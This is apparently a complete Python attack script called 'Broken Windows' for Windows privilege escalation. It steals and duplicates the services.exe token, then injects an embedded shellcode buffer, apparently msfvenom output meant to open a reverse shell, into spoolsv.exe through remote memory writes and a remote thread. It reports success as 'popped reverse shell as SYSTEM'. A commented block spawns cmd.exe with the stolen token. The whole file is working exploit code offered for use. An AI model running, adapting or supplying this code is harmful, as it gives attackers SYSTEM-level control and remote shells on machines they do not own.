import sys, ctypes
from ctypes.wintypes import *

import psutil


def get_pids():

    services_pid = None
    spoolsv_pid = None
    
    for process in psutil.process_iter():
        if process.name() == "services.exe":
            services_pid = process.pid
        elif process.name() == "spoolsv.exe":
            spoolsv_pid = process.pid
            
    if not services_pid:
        print("Unable to find services.exe.")
        sys.exit()
    elif not spoolsv_pid:
        print("Unable to find spoolsv.exe.")
        sys.exit()
    else:
        print("Obtained PIDs for services.exe and spoolsv.exe.")
        return services_pid, spoolsv_pid


def impersonate(services_pid):
    
    services_process_handle = ctypes.windll.kernel32.OpenProcess(0x1000, False, services_pid)
    if services_process_handle == None:
        print("Failed to get handle to services.exe.")
        sys.exit()

    services_token_handle = HANDLE()
    status = ctypes.windll.advapi32.OpenProcessToken(services_process_handle, 0x0002, ctypes.byref(services_token_handle))
    if status == False:
        print("Failed to get handle to services.exe token. Is SeImpersonatePrivilege enabled?")
        sys.exit()

    impersonation_token_handle = HANDLE()
    status = ctypes.windll.advapi32.DuplicateTokenEx(services_token_handle, 0x0001 | 0x0002 | 0x0008 | 0x0080 | 0x0100 | 0x0004, None, 3, 2, ctypes.byref(impersonation_token_handle))
    if status == False:
        print("Failed to create impersonation token.")
        sys.exit()

    status = ctypes.windll.advapi32.SetThreadToken(None, impersonation_token_handle)
    if status == False:
        print("Failed to set our thread's token to the impersonation token.")
        sys.exit()

    ctypes.windll.kernel32.CloseHandle(services_process_handle)
    ctypes.windll.kernel32.CloseHandle(services_token_handle)
    ctypes.windll.kernel32.CloseHandle(impersonation_token_handle)


def debug(spoolsv_pid, buf):

    spoolsv_process_handle = ctypes.windll.kernel32.OpenProcess(0x0010 | 0x0020 | 0x0008 | 0x0002, False, spoolsv_pid)
    if spoolsv_process_handle == None:
        print("Failed to get handle to spoolsv.exe.")
        sys.exit()

    base_address = ctypes.windll.kernel32.VirtualAllocEx(spoolsv_process_handle, None, len(buf), 0x00001000 | 0x00002000, 0x40)
    if base_address == None:
        print("Failed to allocate memory in spoolsv.exe virtual address space.")
        sys.exit()

    status = ctypes.windll.kernel32.WriteProcessMemory(spoolsv_process_handle, base_address, buf, len(buf), None)
    if status == False:
        print("Failed to write payload in spoolsv.exe virtual addresss space.")
        sys.exit()
        
    payload_thread_handle = ctypes.windll.kernel32.CreateRemoteThreadEx(spoolsv_process_handle, None, 0, base_address, None, 0, None, None)
    if payload_thread_handle == None:
        print("Failed to create remote thread in spoolsv.exe.")
        sys.exit()

    ctypes.windll.kernel32.CloseHandle(spoolsv_process_handle)
    ctypes.windll.kernel32.CloseHandle(payload_thread_handle)

    print("Successfully popped reverse shell as SYSTEM.")


if __name__ == "__main__":

    # paste in payload here, use msfvenom and choose python file type
    buf =  b""
    buf += b"\xf8\x98\x9f\x91\x99\x91\x9f\xfc\x9f\x91\x93\x9b\x98"
    buf += b"\xf8\x9f\xfc\x9e\x99\x92\xfd\x92\x98\xfd\x93\x9b\x98"
    buf += b"\x98\x9b\x9e\x9b\x92\xfd\xdb\xc3\xbe\x97\xe8\x9e\x95"
    buf += b"\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x74\x31\x75\x17\x03"
    buf += b"\x75\x17\x83\x7a\x14\x7c\x60\x78\xad\x02\x6f\x70\xc6"
    buf += b"\xc5\x70\x70\x17\x87\x21\x31\x47\x55\x93\xe7\x2f\x68"
    buf += b"\xc1\x62\xf8\x01\xb7\x0c\xb0\x9e\x6a\xd4\x08\x2a\xd8"
    buf += b"\xc4\xc0\xa7\xaf\x54\x99\xb8\xf8\x1e\x53\x8a\x37\x57"
    buf += b"\x2b\x25\xf8\xcb\x90\x24\x84\x11\xc5\x86\x35\xd4\xdc"
    buf += b"\xca\xf4\xd7\x1f\x36\x1b\x85\xde\xe6\xac\xa2\xb3\x28"
    buf += b"\xa6\xf6\x0f\x61\xb9\x26\xe4\xf1\x31\xc6\xfb\xf1\x09"
    buf += b"\x43\x3b\x85\xee\x03\xbd\xb6\xa1\x18\xf5\x2e\x06\x95"
    buf += b"\x46\x6f\xcf\xa8\x96\x8c\x99\xe2\xe9\x9a\x67\x79\x21"
    buf += b"\x95\x20\x7c\x9c\xe8\x81\xb7\x68\xc2\x21\xeb\x28\xe5"
    buf += b"\x6b\xfe\xeb\xe4\xaa\x38\x0c\x93\xdd\x74\xcf\x10\x3a"
    buf += b"\x8c\x8a\x91\x93\xf9\xcc\xba\x57\x8a\xad\x1e\x11\x8d"
    buf += b"\xfd\x39\xe0\x06\xf1\x8d\xa6\x93\x4a\x12\x6e\xa2\x9a"
    buf += b"\x6b\xfb\xa0\x92\x24\xfa\x78\xe3\xec\xbd\x20\xba\x55"
    buf += b"\x64\x91\x1a\x27\xc1\x50\xc1\xef\x72\xbe\xd5\xae\x26"
    buf += b"\xc1\xf6\x69\x86\x64\xad\xc1\x83\x84\xb8\x85\x6c\x57"
    buf += b"\xc5\x77\xda\x19\x4d\xfb\xee\x3a\x81\xc9\x0e\xc4\xa4"
    buf += b"\x7b\x46\x4d\xc0\xcc\xd9\xa1\xad\xcc\xd9\x39\xe7\x47"
    buf += b"\x3c\x70\x4b\x55\xbf\x82\x86\x9a\x17\x0c\x68\x5b\x3c"
    buf += b"\x59\xe0\xb8\xf0\xd0\x03\x01\xb3\xae\x94\xa4\xc4\xd1"
    buf += b"\x8e\xe5\x43\xc7\x59\xf7\x52\x17\x9a\xae\x15\xad\xb3"
    buf += b"\xd0\xfd\xd1\x3c\x05\x51\x81\x8f\x97\x9b\x6c\x21\x18"
    buf += b"\x53\x91\x81\xd0\xed\xaf\x4a\x1e\x2d\x67\xc2\x21\xef"
    buf += b"\xcd\x3e\xae\x2f\xd1\x40\x64\x87\x98\x78\xed\x08\xdb"
    buf += b"\xde\xbe\xa1\x39\x96\xb7\x4b\xfc\x9d\x51\x0e\x8a\x80"
    buf += b"\x9e\x84\x3a\xc2\xa5\x67\xb8\xc4\x25\x21\x04\xa7\x48"
    buf += b"\xd5\x74\x28\x93\x15\x74\x69\xc3\x54\x24\x21\x6a\xb4"
    buf += b"\x93\xe6\x3b\x74\x2a\xc9\xae\x8b\x15\x88\x7e\x76\x59"
    buf += b"\x6c\xb8\x32\x85\x25\x47\xba\x8d\x48\x03\x98\x15\x95"
    buf += b"\x8c\x88\x6d\x90\x6b\x1e\x3d\xe3\x23\xde\xed\xa2\x93"
    buf += b"\xa9\xf2\xe5\x55\x7a\x45\x19\x9d\x37\xdc\x24\x52\x41"
    buf += b"\x1f\xe7\xd1\x28\x53\xd7\xa3\x34\xbe\x60\x9d\x18\x08"
    buf += b"\x8e\x17\x17\x86\x31\x12\x20\x11\xac\x02\xce\xc8\x74"
    buf += b"\x32\x85\x50\xdc\xf2\x5c\x32\x74\x49\x3d\xc5\xa2\xfa"
    buf += b"\xbd\xfd\x65\xc7\xc7\x81\x7f\xb7\x33\x99\xf5\xb2\x78"
    buf += b"\x1e\xe5\xce\x11\xca\x09\x76\xaf\x83\xd0\x77\xfa"

    print("Starting Broken Windows...\n")

    services_pid, spoolsv_pid = get_pids()
    impersonate(services_pid)
    debug(spoolsv_pid, buf)

"""
STARTUPINFOW = STARTUPINFOW()
STARTUPINFOW.cb = sizeof(STARTUPINFOW)
STARTUPINFOW.lpDesktop = "WinSta0\\default"
PROCESS_INFORMATION = PROCESS_INFORMATION()
status = CreateProcessWithTokenW(duplicated_token, 0x00000001, "C:\\Windows\\System32\\cmd.exe", None, 0x00000010, None, None, STARTUPINFOW, PROCESS_INFORMATION)
print(status)
print(PROCESS_INFORMATION.hProcess)
status = CloseHandle(PROCESS_INFORMATION.hProcess)
print(status)
status = CloseHandle(PROCESS_INFORMATION.hThread)
print(status)
"""
